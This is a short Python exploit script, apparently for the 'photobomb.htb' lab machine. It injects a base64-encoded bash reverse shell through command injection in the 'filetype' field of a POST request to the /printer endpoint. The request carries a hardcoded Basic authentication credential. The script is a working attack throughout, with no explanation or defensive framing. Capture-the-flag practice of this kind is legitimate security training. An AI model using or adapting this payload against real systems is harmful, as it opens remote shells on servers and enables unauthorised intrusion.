import sys
import base64
import requests

# Making reverse_shell

def rev(ip,port):
	shell = "bash -i >& /dev/tcp/"+ ip + "/"+ port +" 0>&1"
	encode_shell = base64.b64encode(shell.encode('utf-8'))
	payload = "echo -n \'"+ encode_shell.decode('utf-8') + "\'| base64 -d | bash"
	return payload

reverse_shell = rev(sys.argv[1],sys.argv[2])
print("triggering the payload")
# Request for posting payload
 
url = "http://photobomb.htb/printer"
header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}
data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+reverse_shell,"dimensions":"3000x2000"}
r = requests.post(url=url,headers=header,data=data)
print(r.text)
